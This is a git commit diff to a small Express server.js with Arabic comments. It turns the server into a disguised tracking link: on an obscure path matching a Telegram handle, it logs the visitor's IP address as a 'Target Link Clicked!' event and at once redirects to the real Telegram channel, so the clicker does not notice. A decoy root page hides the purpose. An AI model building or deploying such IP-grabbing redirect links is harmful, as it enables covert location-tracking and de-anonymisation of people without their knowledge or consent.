765460452fd180f97c2de2e5d0f086d2b628d8ae
Atef Ammar <bakawat4e@gmail.com>
2026-06-24 06:03:42 +0300

    Update server.js

--- server.js
+++ server.js
@@ -2,11 +2,19 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.get('/', (req, res) => {
+// هذا السطر يمسك الرابط عندما يكتب الزائر الكود في آخر الدومين الخاص بك
+app.get('/uUl8iPwh5iYTVk', (req, res) => {
+    // سحب الآي بي الخاص بالزائر
     const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    console.log("Visitor IP: " + visitorIp);
+    console.log("Target Link Clicked! Visitor IP: " + visitorIp);
     
+    // تحويل الزائر فوراً إلى رابط التليغرام الأصلي
     res.redirect('https://t.me/uUl8iPwh5iYTVk');
+});
+
+// صفحة احتياطية في حال دخل شخص على الدومين الرئيسي مباشرة بدون الكود
+app.get('/', (req, res) => {
+    res.send('Server is active.');
 });
 
 app.listen(PORT, () => {
